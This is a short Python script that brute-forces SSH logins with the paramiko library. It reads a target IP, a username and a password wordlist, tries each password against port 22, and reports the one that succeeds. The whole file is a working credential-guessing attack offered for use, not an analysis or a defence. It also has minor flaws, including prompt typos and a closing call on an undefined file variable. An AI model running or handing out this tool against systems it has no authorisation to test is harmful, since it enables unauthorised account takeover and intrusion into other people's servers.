import paramiko
import sys
import os

target = str(input("enter target ip: "))
username  = str(input("enter username to brutefore: "))
password_file = str(input("enter the ocation of the password file: "))

def ssh_connect(password, code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(target, port = 22, username = username, password = password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

with open(password_file, "r") as file:
    for line in file.readlines():
        password = line.strip()
        
        try:
            response = ssh_connect(password)
            
            if response == 0:
                print ("password found:"+ password)
                exit(0)
            elif response == 1:
                print("no luck")
        except Exception as e:
            print(e)
        pass

input_file.close()